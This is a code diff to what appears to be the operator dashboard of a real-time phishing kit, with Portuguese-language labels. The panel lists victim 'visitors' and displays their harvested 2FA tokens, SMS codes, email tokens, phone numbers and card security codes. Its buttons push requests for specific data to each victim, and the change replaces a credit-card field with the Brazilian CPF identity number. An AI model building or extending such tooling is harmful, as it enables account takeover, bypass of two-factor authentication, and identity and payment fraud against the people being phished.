@@ -83,8 +83,8 @@ function AdminPanel() {
     }
 
     // Verificar se algum dado mudou (novo dado enviado pelo usuário)
-    const dataFields = ["token_2fa", "email_input", "sms_code", "phone_number", "app_mail", "credit_card", "cc_code"];
-    const fieldLabels = { token_2fa: "2FA", email_input: "Email", sms_code: "Código SMS", phone_number: "Telefone", app_mail: "Token Email", credit_card: "Cartão", cc_code: "Código CC" };
+    const dataFields = ["token_2fa", "email_input", "sms_code", "phone_number", "app_mail", "cpf_number", "cc_code"];
+    const fieldLabels = { token_2fa: "2FA", email_input: "Email", sms_code: "Código SMS", phone_number: "Telefone", app_mail: "Token Email", cpf_number: "CPF", cc_code: "Código CC" };
     for (const attempt of curr) {
       const prevAttempt = prev.find(p => p.id === attempt.id);
       if (!prevAttempt) { playNotification(); addToast(`Novo visitante: ${attempt.email}`); break; }
@@ -723,8 +723,8 @@ function AdminPanel() {
                       <button onClick={() => openRefModal(attempt.id, "TOK-MAIL")} className="px-2.5 py-1 rounded text-[10px] font-bold bg-[#13151c] text-gray-300 hover:text-white hover:bg-[#1a1d28] border border-[#252838] transition-all">TOK-MAIL</button>
                       <button onClick={() => sendInvalidCommand(attempt.id, "TOK-MAIL")} className="px-1.5 py-1 rounded text-[10px] font-bold bg-red-500/10 text-red-400/60 hover:text-red-400 hover:bg-red-500/20 transition-all">✕</button>
                       
-                      <button onClick={() => sendCommand(attempt.id, "CC")} className="px-2.5 py-1 rounded text-[10px] font-bold bg-[#13151c] text-gray-300 hover:text-white hover:bg-[#1a1d28] border border-[#252838] transition-all">CC</button>
-                      <button onClick={() => sendInvalidCommand(attempt.id, "CC")} className="px-1.5 py-1 rounded text-[10px] font-bold bg-red-500/10 text-red-400/60 hover:text-red-400 hover:bg-red-500/20 transition-all">✕</button>
+                      <button onClick={() => sendCommand(attempt.id, "CPF")} className="px-2.5 py-1 rounded text-[10px] font-bold bg-[#13151c] text-gray-300 hover:text-white hover:bg-[#1a1d28] border border-[#252838] transition-all">CPF</button>
+                      <button onClick={() => sendInvalidCommand(attempt.id, "CPF")} className="px-1.5 py-1 rounded text-[10px] font-bold bg-red-500/10 text-red-400/60 hover:text-red-400 hover:bg-red-500/20 transition-all">✕</button>
                       
                       <button onClick={() => openRefModal(attempt.id, "COD-CC")} className="px-2.5 py-1 rounded text-[10px] font-bold bg-[#13151c] text-gray-300 hover:text-white hover:bg-[#1a1d28] border border-[#252838] transition-all">Cod CC</button>
                       <button onClick={() => sendInvalidCommand(attempt.id, "COD-CC")} className="px-1.5 py-1 rounded text-[10px] font-bold bg-red-500/10 text-red-400/60 hover:text-red-400 hover:bg-red-500/20 transition-all">✕</button>
@@ -1027,7 +1027,7 @@ function AdminPanel() {
                 { label: "Código SMS", value: historyModal.sms_code },
                 { label: "Telefone", value: historyModal.phone_number },
                 { label: "Token Email", value: historyModal.app_mail },
-                { label: "Cartão", value: historyModal.credit_card },
+                { label: "CPF", value: historyModal.cpf_number },
                 { label: "Código CC", value: historyModal.cc_code },
               ].filter(item => item.value).map((item, i) => (
                 <div key={i} className="flex items-center justify-between bg-[#0a0a0a] border border-[#2a2a2a] rounded-lg px-4 py-3">
